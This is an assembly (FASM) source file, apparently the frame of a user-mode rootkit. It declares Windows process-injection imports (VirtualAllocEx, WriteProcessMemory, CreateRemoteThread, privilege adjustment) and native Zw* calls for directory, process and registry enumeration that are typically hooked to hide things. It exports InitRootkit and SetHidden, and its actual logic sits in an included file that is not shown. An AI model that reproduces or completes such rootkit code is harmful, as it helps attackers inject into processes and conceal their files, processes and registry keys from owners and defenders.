format MS COFF

include '%fasminc%\win32a.inc'

extrn '__imp___wcsicmp' 		   as wcsicmp: dword
extrn '__imp__VirtualAllocEx@20'	   as VirtualAllocEx: dword
extrn '__imp__DuplicateHandle@28'	   as DuplicateHandle: dword
extrn '__imp__WriteProcessMemory@20'	   as WriteProcessMemory: dword
extrn '__imp__CreateRemoteThread@28'	   as CreateRemoteThread: dword
extrn '__imp__CreateToolhelp32Snapshot@8'  as CreateToolhelp32Snapshot: dword
extrn '__imp__Process32First@8' 	   as Process32First: dword
extrn '__imp__OpenProcess@12'		   as OpenProcess: dword
extrn '__imp__CloseHandle@4'		   as CloseHandle: dword
extrn '__imp__Process32Next@8'		   as Process32Next: dword
extrn '__imp__OpenProcessToken@12'	   as OpenProcessToken: dword
extrn '__imp__LookupPrivilegeValueA@12'    as LookupPrivilegeValue: dword
extrn '__imp__AdjustTokenPrivileges@24'    as AdjustTokenPrivileges: dword
extrn '__imp__VirtualProtect@16'	   as VirtualProtect: dword
extrn '__imp__ZwQueryDirectoryFile@44'	   as ZwQueryDirectoryFile: dword
extrn '__imp___wcsnicmp'		   as wcsnicmp: dword
extrn '__imp__ZwQuerySystemInformation@16' as ZwQuerySystemInformation: dword
extrn '__imp__ZwEnumerateValueKey@24'	   as ZwEnumerateValueKey: dword
extrn '__imp__wcsncpy'			   as wcsncpy: dword
extrn '__imp__ZwClose@4'		   as ZwClose: dword
extrn '__imp__ZwOpenKey@12'		   as ZwOpenKey: dword
extrn '__imp__ZwEnumerateKey@24'	   as ZwEnumerateKey: dword
extrn '__imp__RtlInitUnicodeString@8'	   as RtlInitUnicodeString: dword
extrn '__imp__MapViewOfFile@20' 	   as MapViewOfFile: dword
extrn '__imp__ReadProcessMemory@20'	   as ReadProcessMemory: dword
extrn '__imp__ZwCreateThread@32'	   as ZwCreateThread: dword
extrn '__imp__GetModuleFileNameW@12'	   as GetModuleFileNameW: dword
extrn '__imp__CreateFileMappingA@24'	   as CreateFileMapping: dword
extrn '__imp__mbstowcs' 		   as mbstowcs: dword


section '.text' code readable writeable executable

include 'micrork.inc'

public InitRootkit as '_InitRootkit@0'
public SetHidden   as '_SetHidden@20'
